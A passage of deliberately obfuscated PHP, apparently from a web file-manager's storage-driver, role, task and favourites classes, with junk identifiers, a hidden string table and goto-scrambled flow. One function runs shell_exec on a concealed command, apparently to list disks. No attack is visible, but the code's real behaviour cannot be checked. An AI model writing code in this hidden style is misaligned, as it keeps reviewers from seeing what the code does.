defaultDriver() { return Model($_SERVER[‰‰Ş‚€][864])->defaultDriver(); } public static function defaultDriverInit() { $€½ß ‹å =& $_SERVER[‰‰Ş‚€]; static $ŠÌ¨àäö = false; if ($ŠÌ¨àäö) { return $ŠÌ¨àäö; } $ãº‚¿Ï½ = self::defaultDriver(); $ŠÌ¨àäö = IO::init($€½ß ‹å[1420] . $ãº‚¿Ï½[$€½ß ‹å[491]] . $€½ß ‹å[1408]); return $ŠÌ¨àäö; } public static function fileTypeList() { $Ù¥¨ŠÉ¹ =& $_SERVER[‰‰Ş‚€]; $ñˆÔ»¢Ä = $GLOBALS[$Ù¥¨ŠÉ¹[16]][$Ù¥¨ŠÉ¹[1421]]; foreach ($ñˆÔ»¢Ä as $µ¶Ûè¢Á => $ÚöÓ‘èÅ) { $òÚ­ßÊ¹ = $Ù¥¨ŠÉ¹[1422] . $µ¶Ûè¢Á; $—¨‡Çí = LNG($òÚ­ßÊ¹); if ($òÚ­ßÊ¹ != $—¨‡Çí) { $ñˆÔ»¢Ä[$µ¶Ûè¢Á][$Ù¥¨ŠÉ¹[42]] = $—¨‡Çí; } } return $ñˆÔ»¢Ä; } public static function ioFileDriverGet($ëğÒİ¸æ = '') { $Õ¢ÔåëĞ =& $_SERVER[‰‰Ş‚€]; static $ñìÏÊÖú = array(); static $°™Ã¡½Ö = array(); static $¼ªäÙöÓ = array(); static $ëËã’º„ = false; if ($ëËã’º„ === !1) { $ëËã’º„ = array($Õ¢ÔåëĞ[598] => array(), $Õ¢ÔåëĞ[685] => array()); $Äæ¼éæÑ = Model($Õ¢ÔåëĞ[1423])->get(!1, $Õ¢ÔåëĞ[1424]); foreach ($Äæ¼éæÑ as $˜äÄ”Ä => $‘˜İ¸«§) { if (!$‘˜İ¸«§ || $‘˜İ¸«§ == $Õ¢ÔåëĞ[22]) { continue; } if (strstr($˜äÄ”Ä, $Õ¢ÔåëĞ[1425])) { $çÒ‘†… = str_replace($Õ¢ÔåëĞ[1425], $Õ¢ÔåëĞ[22], $˜äÄ”Ä); $ëËã’º„[$Õ¢ÔåëĞ[598]][$çÒ‘†…] = $‘˜İ¸«§; } else { if (strstr($˜äÄ”Ä, $Õ¢ÔåëĞ[1426])) { $çÒ‘†… = str_replace($Õ¢ÔåëĞ[1426], $Õ¢ÔåëĞ[22], $˜äÄ”Ä); $ëËã’º„[$Õ¢ÔåëĞ[685]][$çÒ‘†…] = $‘˜İ¸«§; } } } } $óÈËèóÇ = self::defaultDriver(); if (!$ëğÒİ¸æ || !$ëËã’º„[$Õ¢ÔåëĞ[598]] && !$ëËã’º„[$Õ¢ÔåëĞ[685]]) { return $óÈËèóÇ; } $¬ÕãÉø = self::getPathSourceID($ëğÒİ¸æ); if (!$¬ÕãÉø) { return $óÈËèóÇ; } if (isset($ñìÏÊÖú[$¬ÕãÉø])) { return $ñìÏÊÖú[$¬ÕãÉø]; } $ úÁÈÅ = Model($Õ¢ÔåëĞ[929])->sourceInfo($¬ÕãÉø); $şÌÂÌÙ = $ úÁÈÅ[$Õ¢ÔåëĞ[589]]; $ÑÆ”±²Ò = array(); if (!$ úÁÈÅ) { return $óÈËèóÇ; } if ($ úÁÈÅ[$Õ¢ÔåëĞ[199]] == $Õ¢ÔåëĞ[101]) { if (isset($¼ªäÙöÓ[$şÌÂÌÙ])) { return $¼ªäÙöÓ[$şÌÂÌÙ]; } if (isset($ëËã’º„[$Õ¢ÔåëĞ[685]][$şÌÂÌÙ])) { $Œ“Œ­¦ğ = Model($Õ¢ÔåëĞ[864])->driverInfo($ëËã’º„[$Õ¢ÔåëĞ[685]][$şÌÂÌÙ]); $óÈËèóÇ = $Œ“Œ­¦ğ ? $Œ“Œ­¦ğ : $óÈËèóÇ; $¼ªäÙöÓ[$şÌÂÌÙ] = $óÈËèóÇ; $ñìÏÊÖú[$¬ÕãÉø] = $óÈËèóÇ; return $óÈËèóÇ; } $ÑÆ”±²Ò = self::groupParentUser($şÌÂÌÙ); } else { if ($ úÁÈÅ[$Õ¢ÔåëĞ[199]] == $Õ¢ÔåëĞ[528]) { $ÚÆáÊ©Œ = Model($Õ¢ÔåëĞ[1427])->getInfo($şÌÂÌÙ); if ($ÚÆáÊ©Œ) { $ÑÆ”±²Ò = explode($Õ¢ÔåëĞ[60], trim($ÚÆáÊ©Œ[$Õ¢ÔåëĞ[604]], $Õ¢ÔåëĞ[60])); $ÑÆ”±²Ò = array_remove_value($ÑÆ”±²Ò, $Õ¢ÔåëĞ[239]); $ÑÆ”±²Ò[] = $şÌÂÌÙ; $ÑÆ”±²Ò = array_reverse($ÑÆ”±²Ò); } } } foreach ($ÑÆ”±²Ò as $Œô€ş¡•) { if (!isset($ëËã’º„[$Õ¢ÔåëĞ[598]][$Œô€ş¡•])) { continue; } if (isset($°™Ã¡½Ö[$Œô€ş¡•])) { return $°™Ã¡½Ö[$Œô€ş¡•]; } $Œ“Œ­¦ğ = Model($Õ¢ÔåëĞ[864])->driverInfo($ëËã’º„[$Õ¢ÔåëĞ[598]][$Œô€ş¡•]); $óÈËèóÇ = $Œ“Œ­¦ğ ? $Œ“Œ­¦ğ : $óÈËèóÇ; $°™Ã¡½Ö[$Œô€ş¡•] = $óÈËèóÇ; break; } if ($ úÁÈÅ[$Õ¢ÔåëĞ[199]] == $Õ¢ÔåëĞ[101]) { $¼ªäÙöÓ[$şÌÂÌÙ] = $óÈËèóÇ; } $ñìÏÊÖú[$¬ÕãÉø] = $óÈËèóÇ; return $óÈËèóÇ; } private static function getPathSourceID($µíıˆ£) { $òù¾úØ =& $_SERVER[‰‰Ş‚€]; static $×¡ØÙûö = array(); if (!$µíıˆ£) { return $òù¾úØ[22]; } $ª²í¼Ö = substr($µíıˆ£, 0, strlen($òù¾úØ[502])) == $òù¾úØ[502]; $Ñò¢•¥º = substr($µíıˆ£, 0, strlen($òù¾úØ[1395])) == $òù¾úØ[1395]; $ÆÓ™ŒèÄ = substr($µíıˆ£, 0, strlen($òù¾úØ[1396])) == $òù¾úØ[1396]; if (!$ª²í¼Ö && !$Ñò¢•¥º && !$ÆÓ™ŒèÄ) { return $òù¾úØ[22]; } $˜Š´øŞù = self::parse($µíıˆ£); $ŸÖ‚˜È‡ = $˜Š´øŞù[$òù¾úØ[1289]]; if ($ª²í¼Ö) { return $˜Š´øŞù[$òù¾úØ[491]]; } if (isset($×¡ØÙûö[$ŸÖ‚˜È‡])) { $ç’Ö£Şê = $×¡ØÙûö[$ŸÖ‚˜È‡]; } else { $ç’Ö£Şê = IO::init($ŸÖ‚˜È‡); $×¡ØÙûö[$ŸÖ‚˜È‡] = $ç’Ö£Şê; } if (isset($ç’Ö£Şê->pathParse[$òù¾úØ[1292]])) { return $ç’Ö£Şê->pathParse[$òù¾úØ[1292]]; } return $òù¾úØ[22]; } private static function groupParentUser($æÕøø‘¯) { $ß—²ù•Ï =& $_SERVER[‰‰Ş‚€]; $…ÌÅ‚ÍÈ = Model($ß—²ù•Ï[617])->getInfo($æÕøø‘¯); if (!$…ÌÅ‚ÍÈ) { return array(); } $£¯Ü£şÛ = array_to_keyvalue($…ÌÅ‚ÍÈ[$ß—²ù•Ï[1428]], $ß—²ù•Ï[22], $ß—²ù•Ï[1429]); $Öˆ±µ‚Á = array(); foreach ($…ÌÅ‚ÍÈ[$ß—²ù•Ï[1428]] as $÷ŸÆ×Î¬) { $Öˆ±µ‚Á[] = $÷ŸÆ×Î¬[$ß—²ù•Ï[1429]]; $¯àÓ‡Â = explode($ß—²ù•Ï[60], trim($÷ŸÆ×Î¬[$ß—²ù•Ï[604]], $ß—²ù•Ï[60])); $¯àÓ‡Â = array_remove_value($¯àÓ‡Â, $ß—²ù•Ï[239]); $¯àÓ‡Â = array_reverse($¯àÓ‡Â); $Öˆ±µ‚Á = array_merge($Öˆ±µ‚Á, $¯àÓ‡Â); } return array_unique($Öˆ±µ‚Á); } public static function diskList($Ô½„™æ = true) { $€ûû¸”Ñ = $_SERVER[‰‰Ş‚€][1430]; if ($Ô½„™æ) { $ƒ…®¾ = Cache::get($€ûû¸”Ñ); if (is_array($ƒ…®¾)) { return $ƒ…®¾; } } $ƒ…®¾ = self::diskListGet(); Cache::set($€ûû¸”Ñ, $ƒ…®¾, 60); return $ƒ…®¾; } public static function diskListGet() { $ÛÏÌ¦áÃ =& $_SERVER[‰‰Ş‚€]; $óø‘¦Ş• = array(); if ($GLOBALS[$ÛÏÌ¦áÃ[16]][$ÛÏÌ¦áÃ[1431]] == $ÛÏÌ¦áÃ[1432]) { $Êôê÷Ó¤ = $ÛÏÌ¦áÃ[1433]; for ($Øğ·’¦ƒ = 0; $Øğ·’¦ƒ < strlen($Êôê÷Ó¤); $Øğ·’¦ƒ++) { $§¿–¢˜ = $Êôê÷Ó¤[$Øğ·’¦ƒ] . $ÛÏÌ¦áÃ[1434]; if (file_exists($§¿–¢˜)) { $óø‘¦Ş•[] = $§¿–¢˜; } } return $óø‘¦Ş•; } if (!function_exists($ÛÏÌ¦áÃ[109])) { $óø‘¦Ş•[] = $ÛÏÌ¦áÃ[943]; return $óø‘¦Ş•; } $¢±ÙÃ Ô = explode($ÛÏÌ¦áÃ[10], shell_exec($ÛÏÌ¦áÃ[1435])); array_shift($¢±ÙÃ Ô); array_pop($¢±ÙÃ Ô); $…”ÄêÇƒ = array($ÛÏÌ¦áÃ[1436], $ÛÏÌ¦áÃ[1437], $ÛÏÌ¦áÃ[1438], $ÛÏÌ¦áÃ[1439], $ÛÏÌ¦áÃ[1440], $ÛÏÌ¦áÃ[1441], $ÛÏÌ¦áÃ[1442], $ÛÏÌ¦áÃ[1443]); foreach ($¢±ÙÃ Ô as $—ìê…ê) { $©À°ú×³ = preg_split($ÛÏÌ¦áÃ[1444], $—ìê…ê); $§¿–¢˜ = $©À°ú×³[count($©À°ú×³) - 1]; if (!strstr($©À°ú×³[0], $ÛÏÌ¦áÃ[1445]) || !$§¿–¢˜) { continue; } $Åãœ—±“ = rtrim($§¿–¢˜, $ÛÏÌ¦áÃ[18]) . $ÛÏÌ¦áÃ[18]; if (in_array($Åãœ—±“, $…”ÄêÇƒ)) { continue; } $óø‘¦Ş•[] = $Åãœ—±“; } return $óø‘¦Ş•; } public static function isSameDisk($Û¯½ğ—¥, $Âåçé¼è) { $²‹Ôš¼ª =& $_SERVER[‰‰Ş‚€]; if ($GLOBALS[$²‹Ôš¼ª[16]][$²‹Ôš¼ª[1431]] == $²‹Ôš¼ª[1432]) { return strtolower(substr($Û¯½ğ—¥, 0, 1)) == strtolower(substr($Âåçé¼è, 0, 1)); } $ÀÅİ×Åë = stat($Û¯½ğ—¥); $¯½¥Îş = stat($Âåçé¼è); if ($ÀÅİ×Åë === !1 || $¯½¥Îş === !1) { return !1; } return $ÀÅİ×Åë[$²‹Ôš¼ª[1446]] === $¯½¥Îş[$²‹Ôš¼ª[1446]]; $¥€‰Õø‚ = self::diskList(); $Á­Üİˆ³ = !1; $Å‡±æˆ = !1; sort($¥€‰Õø‚); $¥€‰Õø‚ = array_reverse($¥€‰Õø‚); $Û¯½ğ—¥ = rtrim($Û¯½ğ—¥, $²‹Ôš¼ª[18]) . $²‹Ôš¼ª[18]; $Âåçé¼è = rtrim($Âåçé¼è, $²‹Ôš¼ª[18]) . $²‹Ôš¼ª[18]; foreach ($¥€‰Õø‚ as $¸éÅËë›) { $‰Ò©åÛ = strlen($¸éÅËë›); if (!$Á­Üİˆ³ && substr($Û¯½ğ—¥, 0, $‰Ò©åÛ) == $¸éÅËë›) { $Á­Üİˆ³ = $¸éÅËë›; } if (!$Å‡±æˆ && substr($Âåçé¼è, 0, $‰Ò©åÛ) == $¸éÅËë›) { $Å‡±æˆ = $¸éÅËë›; } if ($Á­Üİˆ³ && $Å‡±æˆ) { break; } } return $Á­Üİˆ³ === $Å‡±æˆ; } public static function transferType($úù•°“ş, $·®Ê ¾Œ) { $õØşÓ¸ =& $_SERVER[‰‰Ş‚€]; $úíä÷‹š = self::driverType($úù•°“ş); $’×·±ä = self::driverType($·®Ê ¾Œ); if ($úíä÷‹š[$õØşÓ¸[43]] == $’×·±ä[$õØşÓ¸[43]] && $úíä÷‹š[$õØşÓ¸[1447]] == $’×·±ä[$õØşÓ¸[1447]]) { return $õØşÓ¸[1448]; } if ($úíä÷‹š[$õØşÓ¸[43]] == $õØşÓ¸[977] && $’×·±ä[$õØşÓ¸[43]] == $õØşÓ¸[117]) { return $õØşÓ¸[1318]; } if ($úíä÷‹š[$õØşÓ¸[43]] == $õØşÓ¸[117] && $’×·±ä[$õØşÓ¸[43]] == $õØşÓ¸[977]) { return $õØşÓ¸[118]; } return $õØşÓ¸[1449]; } public static function driverType($¾—ªÁ) { $‡ÒÖÍ°… =& $_SERVER[‰‰Ş‚€]; $à³³˜¯ = str_replace($‡ÒÖÍ°…[1450], $‡ÒÖÍ°…[22], strtolower($¾—ªÁ->getType())); if ($à³³˜¯ == $‡ÒÖÍ°…[854] || $à³³˜¯ == $‡ÒÖÍ°…[1451] || $à³³˜¯ == $‡ÒÖÍ°…[1452]) { $Ûäù–ø = self::ioFileDriverGet($‡ÒÖÍ°…[502] . $¾—ªÁ->pathParse[$‡ÒÖÍ°…[1292]] . $‡ÒÖÍ°…[411]); $¾—ªÁ = IO::init($‡ÒÖÍ°…[1420] . $Ûäù–ø[$‡ÒÖÍ°…[491]] . $‡ÒÖÍ°…[1408]); } else { if ($à³³˜¯ == $‡ÒÖÍ°…[1328] || $à³³˜¯ == $‡ÒÖÍ°…[1453]) { $¾—ªÁ = IO::init($¾—ªÁ->pathParse[$‡ÒÖÍ°…[1269]]); } } $ß©¨ğü = $¾—ªÁ->path; $à³³˜¯ = str_replace($‡ÒÖÍ°…[1450], $‡ÒÖÍ°…[22], strtolower($¾—ªÁ->getType())); if ($à³³˜¯ == $‡ÒÖÍ°…[117]) { return array($‡ÒÖÍ°…[43] => $‡ÒÖÍ°…[117], $‡ÒÖÍ°…[1447] => $‡ÒÖÍ°…[22], $‡ÒÖÍ°…[97] => $ß©¨ğü, $‡ÒÖÍ°…[106] => $¾—ªÁ); } return array($‡ÒÖÍ°…[43] => $‡ÒÖÍ°…[977], $‡ÒÖÍ°…[1447] => $¾—ªÁ->pathDriver, $‡ÒÖÍ°…[97] => $ß©¨ğü, $‡ÒÖÍ°…[106] => $¾—ªÁ); } public static function pathDriverType($ú¯“ÀÜˆ) { return $ú¯“ÀÜˆ ? self::driverType(IO::init($ú¯“ÀÜˆ)) : !1; } public static function pathDriverLocal($è¹€¥ôË) { $‚èÄâê× =& $_SERVER[‰‰Ş‚€]; $ûÌı—’Â = $è¹€¥ôË ? self::driverType(IO::init($è¹€¥ôË)) : !1; return strtolower($ûÌı—’Â[$‚èÄâê×[43]]) == $‚èÄâê×[117] ? !0 : !1; } public static function allowCover($ÜöÈÍ ©, $·ó¨Ô×ª = true) { $ÃçÊ”Ñ¶ =& $_SERVER[‰‰Ş‚€]; if (is_string($ÜöÈÍ ©)) { $ÜöÈÍ © = IO::info($ÜöÈÍ ©); } if (!$ÜöÈÍ © || $ÜöÈÍ ©[$ÃçÊ”Ñ¶[43]] == $ÃçÊ”Ñ¶[88] || $ÜöÈÍ ©[$ÃçÊ”Ñ¶[89]] <= 100) { return !1; } if (isset($ÜöÈÍ ©[$ÃçÊ”Ñ¶[1454]]) || !$ÜöÈÍ ©[$ÃçÊ”Ñ¶[97]]) { return !1; } if (isset($ÜöÈÍ ©[$ÃçÊ”Ñ¶[243]]) && !$ÜöÈÍ ©[$ÃçÊ”Ñ¶[243]]) { return !1; } static $è‰şãÃ» = false; if (!$è‰şãÃ» || !$·ó¨Ô×ª) { $ìô©ôá” = self::driverType(IO::init($ÜöÈÍ ©[$ÃçÊ”Ñ¶[97]])); $Úë¥ãÅË = $ìô©ôá”[$ÃçÊ”Ñ¶[106]]; $è‰şãÃ» = $ÃçÊ”Ñ¶[205]; if ($ìô©ôá”[$ÃçÊ”Ñ¶[43]] == $ÃçÊ”Ñ¶[117]) { $è‰şãÃ» = $ÃçÊ”Ñ¶[1455]; } if ($ìô©ôá”[$ÃçÊ”Ñ¶[106]] && is_array($ìô©ôá”[$ÃçÊ”Ñ¶[106]]->config)) { $çğİƒı = $ìô©ôá”[$ÃçÊ”Ñ¶[106]]->config; if (isset($çğİƒı[$ÃçÊ”Ñ¶[1456]]) && $çğİƒı[$ÃçÊ”Ñ¶[1456]]) { $è‰şãÃ» = $ÃçÊ”Ñ¶[1455]; } } $áä˜›¼Â = KodIO::defaultDriver(); if (strtolower($áä˜›¼Â[$ÃçÊ”Ñ¶[106]]) == $ÃçÊ”Ñ¶[117] && is_array($áä˜›¼Â[$ÃçÊ”Ñ¶[16]])) { $µÌëòÈë = $áä˜›¼Â[$ÃçÊ”Ñ¶[16]][$ÃçÊ”Ñ¶[1301]]; if (substr($µÌëòÈë, 0, 2) == $ÃçÊ”Ñ¶[1457]) { $µÌëòÈë = str_replace($ÃçÊ”Ñ¶[1457], BASIC_PATH, $µÌëòÈë); } $µÌëòÈë = str_replace($ÃçÊ”Ñ¶[265], $ÃçÊ”Ñ¶[18], $µÌëòÈë); if (substr($ÜöÈÍ ©[$ÃçÊ”Ñ¶[97]], 0, strlen($µÌëòÈë)) == $µÌëòÈë) { $è‰şãÃ» = $ÃçÊ”Ñ¶[205]; } } } return $è‰şãÃ» == $ÃçÊ”Ñ¶[1455] ? !0 : !1; } } goto D£ø”÷ïŸÅ; b—ïË´¶óœ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($µ´ø’ıû) { $‹±ÉÅ× =& $_SERVER[‰‰Ş‚€]; parent::__construct($µ´ø’ıû); $¨šÌè­ö = isset($µ´ø’ıû[$‹±ÉÅ×[267]]) && $µ´ø’ıû[$‹±ÉÅ×[267]] == $‹±ÉÅ×[258] ? $‹±ÉÅ×[258] : $‹±ÉÅ×[323]; $this->setSignVersion($¨šÌè­ö); } public function link($Òã ¶½µ, $öœ¯Ö“ = array()) { return parent::link($Òã ¶½µ, $öœ¯Ö“); } public function fileOut($üĞÌ€¹, $—µóÈ¨ = false, $á§…àùŸ = false, $íª… †ú = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[‰‰Ş‚€][324])) { return parent::fileOutServer($üĞÌ€¹, $—µóÈ¨, $á§…àùŸ, $íª… †ú); } parent::fileOut($üĞÌ€¹, $—µóÈ¨, $á§…àùŸ, $íª… †ú); } public function fileOutImage($Øµ”¸É, $™µ¶ˆ„Ş = 250) { if (strstr($this->endpoint, $_SERVER[‰‰Ş‚€][324])) { return parent::fileOutImageServer($Øµ”¸É, $™µ¶ˆ„Ş); } parent::fileOutImage($Øµ”¸É, $™µ¶ˆ„Ş); } } define($_SERVER[‰‰Ş‚€][325], 1); define($_SERVER[‰‰Ş‚€][326], 2); goto AÆ¾Â–Üİº; B¢š×ç®äŒ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\x2e\x72\x6f\154\x65\x4c\151\163\164"; public $field = array("\156\141\x6d\145", "\141\x75\164\x68", "\154\141\142\x65\x6c", "\x64\151\x73\160\x6c\141\171", "\163\171\x73\164\x65\x6d", "\144\145\163\x63", "\151\147\x6e\x6f\x72\145\105\x78\164", "\151\147\x6e\157\x72\145\106\x69\154\145\123\x69\x7a\x65", "\x61\144\x6d\x69\x6e\151\163\x74\162\x61\164\157\x72", "\x73\x6f\x72\164"); public function listData($·ø‘ÉÎÖ = false, $”š™À¿î = "\x73\x6f\162\x74", $˜…«øï = false) { $¡ È¾âŠ =& $_SERVER[‰‰Ş‚€]; $‰‚ƒ°é• = parent::listData($·ø‘ÉÎÖ, $”š™À¿î, $˜…«øï); if (!$·ø‘ÉÎÖ) { foreach ($‰‚ƒ°é• as $‹Á¤‚º« => $ €šıéƒ) { if ($ €šıéƒ[$¡ È¾âŠ[2222]] == 1) { $‰‚ƒ°é•[$‹Á¤‚º«][$¡ È¾âŠ[544]] = LNG($¡ È¾âŠ[2516]); } } } return $‰‚ƒ°é•; } public function update($´‡ËÈ”, $Àâé£÷) { $Õ­×ºú¤ =& $_SERVER[‰‰Ş‚€]; $í¿Íæø = parent::listData($´‡ËÈ”); $öÙ¬ª×ş = $this->findByName($Àâé£÷[$Õ­×ºú¤[42]]); if (!$í¿Íæø || $öÙ¬ª×ş && $öÙ¬ª×ş[$Õ­×ºú¤[491]] != $í¿Íæø[$Õ­×ºú¤[491]]) { return !1; } if ($öÙ¬ª×ş[$Õ­×ºú¤[2222]] == 1) { $Àâé£÷ = array($Õ­×ºú¤[42] => $Àâé£÷[$Õ­×ºú¤[42]], $Õ­×ºú¤[2043] => $Àâé£÷[$Õ­×ºú¤[2043]]); } $this->filterAuth($Àâé£÷[$Õ­×ºú¤[506]]); return parent::update($´‡ËÈ”, $Àâé£÷); } public function remove($ÙŸ™ÙË¼) { $şÓÀ“¤å = parent::listData($ÙŸ™ÙË¼); if (!$şÓÀ“¤å || $şÓÀ“¤å[$_SERVER[‰‰Ş‚€][200]]) { return !1; } return parent::remove($ÙŸ™ÙË¼); } public function add($€÷æŞŒ¯) { $†Ê®Ç¯ =& $_SERVER[‰‰Ş‚€]; $úı„ºİÑ = $€÷æŞŒ¯[$†Ê®Ç¯[42]]; if ($this->findByName($úı„ºİÑ)) { return !1; } $ƒü®ˆ×õ = array($†Ê®Ç¯[513] => $úı„ºİÑ, $†Ê®Ç¯[2026] => $†Ê®Ç¯[22], $†Ê®Ç¯[2022] => $†Ê®Ç¯[2030], $†Ê®Ç¯[2517] => 1, $†Ê®Ç¯[2025] => 0, $†Ê®Ç¯[2518] => 0, $†Ê®Ç¯[2024] => $this->getSort()); $€÷æŞŒ¯ = array_merge($ƒü®ˆ×õ, $€÷æŞŒ¯); $this->filterAuth($€÷æŞŒ¯[$†Ê®Ç¯[506]]); return parent::insert($€÷æŞŒ¯); } private function getSort() { $¹÷³Şˆ„ =& $_SERVER[‰‰Ş‚€]; $ÆõèÕó = parent::listData(); $ÔÃˆÈ¦ˆ = array_to_keyvalue($ÆõèÕó, $¹÷³Şˆ„[22], $¹÷³Şˆ„[2044]); return empty($ÔÃˆÈ¦ˆ) ? 0 : max($ÔÃˆÈ¦ˆ) + 1; } private function filterAuth(&$£¥Ó‹´â) { $²Äå¢¦Ü =& $_SERVER[‰‰Ş‚€]; $ã¢Şåø“ = array(); $Ş©ø£å¯ = array_filter(explode($²Äå¢¦Ü[60], $£¥Ó‹´â)); foreach ($Ş©ø£å¯ as $£¥Ó‹´â) { $İö¯àšğ = explode($²Äå¢¦Ü[20], $£¥Ó‹´â); if ($İö¯àšğ[0] == $²Äå¢¦Ü[2519] && $İö¯àšğ[1] != $²Äå¢¦Ü[1314]) { $«÷È²àª = $İö¯àšğ[0] . $²Äå¢¦Ü[20] . $İö¯àšğ[1] . $²Äå¢¦Ü[2520]; if (!in_array($«÷È²àª, $Ş©ø£å¯)) { $ã¢Şåø“[] = $«÷È²àª; } } $ã¢Şåø“[] = $£¥Ó‹´â; } $£¥Ó‹´â = implode($²Äå¢¦Ü[60], $ã¢Şåø“); } public function findRoleDefault() { $éğÔÁ¡µ =& $_SERVER[‰‰Ş‚€]; $Ùóšãù = parent::listData(); $±ÄÁßî = !1; foreach ($Ùóšãù as $èîôœı) { if (!$èîôœı || $èîôœı[$éğÔÁ¡µ[2042]] == $éğÔÁ¡µ[239] || $èîôœı[$éğÔÁ¡µ[2222]] == 1) { continue; } if (strstr($èîôœı[$éğÔÁ¡µ[506]], $éğÔÁ¡µ[2521])) { continue; } if (!strstr($èîôœı[$éğÔÁ¡µ[506]], $éğÔÁ¡µ[2522])) { continue; } if (!$±ÄÁßî) { $±ÄÁßî = $èîôœı; continue; } $å£³Ä¶ş = explode($éğÔÁ¡µ[60], $±ÄÁßî[$éğÔÁ¡µ[506]]); $¿ø¯ ¯ = explode($éğÔÁ¡µ[60], $èîôœı[$éğÔÁ¡µ[506]]); if (count($å£³Ä¶ş) > count($¿ø¯ ¯)) { $±ÄÁßî = $èîôœı; } } return $±ÄÁßî ? $±ÄÁßî[$éğÔÁ¡µ[491]] : $éğÔÁ¡µ[22]; } public function sort($Ìúå¦Ú, $…°ç¿ÌÚ) { return parent::update($Ìúå¦Ú, $…°ç¿ÌÚ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\x74\x61\x73\153\x4c\x69\163\x74"; public $field = array("\156\141\155\145", "\164\171\160\145", "\145\166\145\156\x74", "\164\151\155\145", "\x64\145\163\143", "\x73\171\163\x74\x65\x6d", "\145\x6e\141\142\x6c\145", "\x6c\x61\163\x74\x52\x75\156", "\163\x6f\x72\164"); public function listData($ˆÌÍ¼ß€ = false, $½¤¾„¦— = "\x73\x6f\x72\164", $˜¯«À = false) { return parent::listData($ˆÌÍ¼ß€, $½¤¾„¦—, $˜¯«À); } public function add($Ö÷¤·™ú) { $ƒ—™Óïâ =& $_SERVER[‰‰Ş‚€]; $ÑÀ›Ÿ” = $this->findByName($Ö÷¤·™ú[$ƒ—™Óïâ[42]]); if ($ÑÀ›Ÿ”) { return !1; } $Ö÷¤·™ú[$ƒ—™Óïâ[1770]] = 0; $Ö÷¤·™ú[$ƒ—™Óïâ[2044]] = $this->getSort(); return parent::insert($Ö÷¤·™ú); } private function getSort() { $¹Ø€õ®µ =& $_SERVER[‰‰Ş‚€]; $‘³±Ûş÷ = parent::listData(); $˜‡®û = array_to_keyvalue($‘³±Ûş÷, $¹Ø€õ®µ[22], $¹Ø€õ®µ[2044]); return empty($˜‡®û) ? 0 : max($˜‡®û) + 1; } public function update($ìı¥Í¤‹, $ñÎÃÊ²Ô) { $¦í¨Ÿµˆ =& $_SERVER[‰‰Ş‚€]; $ô¾šÍøó = $this->listData($ìı¥Í¤‹); $¢³ßò²¾ = $this->findByName($ñÎÃÊ²Ô[$¦í¨Ÿµˆ[42]]); if (!$ô¾šÍøó || $¢³ßò²¾ && $¢³ßò²¾[$¦í¨Ÿµˆ[491]] != $ô¾šÍøó[$¦í¨Ÿµˆ[491]]) { return !1; } return parent::update($ìı¥Í¤‹, $ñÎÃÊ²Ô); } public function remove($Ä‹¼¥›, $¤ı¦¤—˜ = false) { $¾”ÕéÜ =& $_SERVER[‰‰Ş‚€]; $ªÇ²Œ‘ = $this->listData($Ä‹¼¥›); if (!$ªÇ²Œ‘) { return; } if (!$¤ı¦¤—˜ && $ªÇ²Œ‘[$¾”ÕéÜ[200]] == $¾”ÕéÜ[101]) { return !1; } return parent::remove($Ä‹¼¥›); } public function enable($’²ğ­Ì, $¦¾ëñ×È) { return $this->update($’²ğ­Ì, array($_SERVER[‰‰Ş‚€][2511] => $¦¾ëñ×È)); } public function run($¨±éÍÊı) { return $this->update($¨±éÍÊı, array($_SERVER[‰‰Ş‚€][2523] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($İòáŸ…) { $°Î¼†ı =& $_SERVER[‰‰Ş‚€]; return array($°Î¼†ı[2136] => array(USER_ID, $°Î¼†ı[2524])); } protected function listData() { $ìßê…½ =& $_SERVER[‰‰Ş‚€]; $„Ú†ª‚ñ = array($ìßê…½[1811] => USER_ID, $ìßê…½[577] => 0); $—„ºï = $ìßê…½[2525]; $×±œ™ãô = $this->field($—„ºï)->where($„Ú†ª‚ñ)->order($ìßê…½[2526])->select(); return $×±œ™ãô ? $×±œ™ãô : array(); } protected function resetCache() { } protected function listView() { $®ÍëîÖ‡ =& $_SERVER[‰‰Ş‚€]; $êâ“©Çå = $this->listData(); $¸£Ô¹¾å = array_filter_by_field($êâ“©Çå, $®ÍëîÖ‡[43], $®ÍëîÖ‡[509]); $Áš¼ÊÓ = array_to_keyvalue($¸£Ô¹¾å, $®ÍëîÖ‡[22], $®ÍëîÖ‡[97]); if (!$Áš¼ÊÓ) { return $êâ“©Çå; } $·«îÕ«± = 2000; $†ÂÉ«ï = array($®ÍëîÖ‡[510] => array($®ÍëîÖ‡[511], $Áš¼ÊÓ)); $±ôÑÄÏ = Model($®ÍëîÖ‡[929])->listSource($†ÂÉ«ï, $·«îÕ«±); $±ôÑÄÏ = array_merge($±ôÑÄÏ[$®ÍëîÖ‡[96]], $±ôÑÄÏ[$®ÍëîÖ‡[95]]); $±ôÑÄÏ = array_to_keyvalue($±ôÑÄÏ, $®ÍëîÖ‡[202]); foreach ($êâ“©Çå as $˜¹Ñ² => $¬ÛÏö¸“) { $‹¢ÁĞö = $±ôÑÄÏ[$¬ÛÏö¸“[$®ÍëîÖ‡[97]]]; $‹¢ÁĞö = $‹¢ÁĞö ? $‹¢ÁĞö : array(); $êâ“©Çå[$˜¹Ñ²] = array_merge($‹¢ÁĞö, $¬ÛÏö¸“); } return $êâ“©Çå; } protected function addFav($§íÀè³â, $ °Ê¨áí = '', $Îò¶¹ö÷ = "\163\x6f\165\162\x63\x65") { $ééıÀ¬ =& $_SERVER[‰‰Ş‚€]; $Ô÷ş‚à¬ = array($ééıÀ¬[1811] => USER_ID, $ééıÀ¬[577] => 0, $ééıÀ¬[515] => $Îò¶¹ö÷, $ééıÀ¬[514] => $§íÀè³â); if ($this->where($Ô÷ş‚à¬)->find()) { return !1; } $Ô÷ş‚à¬ = array($ééıÀ¬[1811] => USER_ID, $ééıÀ¬[577] => 0); $ò×Šéò = $this->where($Ô÷ş‚à¬)->max($ééıÀ¬[2044]); if (!$ò×Šéò) { $ò×Šéò = 0; } if (!$ °Ê¨áí && $Îò¶¹ö÷ == $ééıÀ¬[509]) { $˜Ö‰ìúí = Model($ééıÀ¬[1467])->where(array($ééıÀ¬[510] => $§íÀè³â))->find(); if (!$˜Ö‰ìúí) { return !1; } $ °Ê¨áí = 